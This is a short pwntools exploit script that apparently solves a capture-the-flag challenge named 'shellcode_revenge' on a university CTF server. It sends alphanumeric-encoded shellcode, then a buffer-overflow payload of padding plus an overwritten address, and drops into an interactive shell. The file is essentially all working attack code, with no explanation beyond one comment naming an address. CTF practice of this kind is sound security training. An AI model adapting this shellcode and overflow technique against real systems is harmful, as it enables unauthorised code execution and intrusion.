from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11011
p = remote(host, port)
#p = process("./shellcode_revenge")
print(p.recvline())


p.sendline(b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FO"+
b"PTj0X40PP4u4NZ4jWSEW18EF0V")

p.sendline(b"A"*0x18 + b"\xc0\x10\x60\x00" + b"\x00\x00\x00\x00")
p.interactive()


#0x6010c0 -- __read_chk addr

